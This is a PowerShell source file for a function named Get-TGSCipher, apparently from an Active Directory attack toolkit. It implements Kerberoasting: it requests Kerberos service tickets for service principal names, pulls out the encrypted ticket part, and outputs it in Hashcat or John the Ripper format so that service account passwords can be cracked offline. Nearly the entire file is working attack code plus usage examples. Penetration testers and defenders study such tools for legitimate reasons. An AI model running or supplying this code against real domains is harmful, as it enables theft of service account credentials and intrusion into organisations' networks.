<#
    Author: Matan Hart (@machosec)
    License: GNU v3
    Required Dependencies: None
    Optional Dependencies: None
#>

function Get-TGSCipher
{
    <#
    .SYNOPSIS
        Requests Kerberos TGS (service ticket) for SPN(s) and retreives the encrypted portion (cipher) of the ticket(s).

        Author: Matan Hart (@machosec)
        License: GNU v3
        Required Dependencies: None
        Optional Dependencies: None 

    .DESCRIPTION
        This function requests a Kerberos TGS (service ticket) for a given SPN(s), determines the target account UPN which runs under    
        the SPN and the encrytpion type of the ticket, and returns the encrypted portion of the ticket in various formats.
        This can be later used to bruteforce the cipher offline and recover the service account password/key.
        Requires Active Directory authentication (domain user is enough). 

    .PARAMETER SPN
        The name of the Service Principal Name for which to ask for Kerberos TGS. Can be parsed on the pipline. 

    .PARAMETER NoQuery
        Do not query Acitve Directory (LDAP) to determine the user prinicipal name (UPN) which runs under the SPN.

    .PARAMETER Format
        Convert the output to a password cracking format. Options are Hashcat, John (John the Ripper) and Kerberoast.

    .EXAMPLE 
        Get-TGSCipher -SPN "MSSQLSvc/SQLServer.lab.com:1433"
        Request a Kerberos TGS for MSSQLSvc/SQLServer.lab.com:1433 and return the target UPN, encryption type and the encrypted part of the ticket.

    .EXAMPLE 
        Get-TGSCipher -SPN "HTTP/WebServer.lab.com" -Format Hashcat 
        Request a Kerberos TGS for HTTP/WebServer.lab.com and return the ticket in Hashcat format.

    .EXAMPLE
        Find-PotentiallyCrackableAccounts -Stealth -GetSPNs | Get-TGSCipher 
        Request Kerberos TGS for all SPNs that run under user accounts in the forest.    
    #>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$True, Position=0, ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        [string]$SPN,
        [parameter(Mandatory=$false, Position=1)]
        [ValidateSet("Hashcat","John", "Kerberoast")]
        [string]$Format,
        [Switch]$NoQuery
    )

    Begin {
        if (!$NoQuery)
        {
            $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            $Path = 'GC://DC=' + ($Forest.RootDomain -Replace ("\.",',DC='))
            #creating ADSI searcher on a GC
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$Path)
            $Searcher.PropertiesToLoad.Add("userprincipalname") | Out-Null
        }
        Add-Type -AssemblyName System.IdentityModel
        $TargetList = @()        
        Write-Verbose "Starting to request SPNs"
    }
    Process {
        $TargetAccount = "N/A"
        if (!$NoQuery) {
            $Searcher.Filter = "(servicePrincipalName=$SPN)"
            $TargetAccount = [string]$Searcher.FindOne().Properties.userprincipalname
        }
        Write-Verbose "Asking for TGS for the SPN: $SPN"
        $ByteStream = $null
        try {
            #requesting TGS (service ticket) for the target SPN
            $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN
            $ByteStream = $Ticket.GetRequest()
        }
        catch {
            Write-Warning "Could not request a TGS for the SPN: $SPN - Is it exists?"
            Write-Verbose "Make sure the SPN: $SPN is registed on Active Directory" 
        }
        if ($ByteStream)
        {
            #converting byte array to hex string
            $HexStream = [System.BitConverter]::ToString($ByteStream) -replace "-"
            #extracting and conveting the hex value of the cipher's etype to decimal
            $eType =  [Convert]::ToInt32(($HexStream -replace ".*A0030201")[0..1] -join "", 16)
            #determing encryption type by etype - https://tools.ietf.org/html/rfc3961 
            $EncType = switch ($eType) {
                1       {"DES-CBC-CRC (1)"}
                3       {"DES-CBC-MD5 (3)"}
                17      {"AES128-CTS-HMAC-SHA-1 (17)"}
                18      {"AES256-CTS-HMAC-SHA-1 (18)"}
                23      {"RC4-HMAC (23)"}
                default {"Unknown ($eType)"}
            }
            try {
                #extracting the EncPart portion of the TGS
                [System.Collections.ArrayList]$Parts = ($HexStream -replace '^(.*?)04820...(.*)','$2') -Split "A48201"
                if ($Parts.Count -gt 2) {
                    $Parts.RemoveAt($Parts.Count - 1)
                    $EncPart = $Parts -join "A48201"
                }
                else {
                    $EncPart = $Parts[0]
                }
                $Target = New-Object psobject -Property @{
                SPN            = $SPN
                Target         = $TargetAccount
                EncryptionType = $EncType
                EncTicketPart  = $EncPart  
                } | Select-Object SPN,Target,EncryptionType,EncTicketPart
                $TargetList += $Target    
            }
            catch {
                Write-Warning "Couldn't extract the EncTicketPart of SPN: $SPN - purge the ticket and try again"
            }
        }
    }
    End {
        if (!$TargetList.EncTicketPart) {
            Write-Error "Could not retrieve any tickets!"
        }
        elseif ($Format)
        {
            $Output = @()
            Write-Verbose "Converting $($TargetList.Count) tickets to $Format format"
            foreach ($Target in $TargetList) {
                if ($Target.EncryptionType -eq "RC4-HMAC (23)") {
                    if ($Format -eq "Kerberoast") {
                        [string]$Output += $Target.EncTicketPart + "\n"
                    }
                    elseif (($Format -eq "John") -or ($Format -eq "Hashcat")) {
                        $Account = $Target.Target -split "@"
                        $Output += "`$krb5tgs`$23`$*$($Account[0])`$$($Account[1])`$$($Target.SPN)*`$" + $Target.EncTicketPart.Substring(0,32) + "`$" + $Target.EncTicketPart.Substring(32)
                    }
                }
                else {
                    Write-Warning "The ticket of SPN: $($Target.SPN) is encrypted with $($Target.EncryptionType) encrytiopn and couldn't be cracked with $Format. Currently only RC4-HMAC is supported)"
                }
            }
        }
        else {
            $Output = $TargetList
        }
        Write-Verbose "returning $($Output.Count) tickets"
        return $Output 
    } 
}
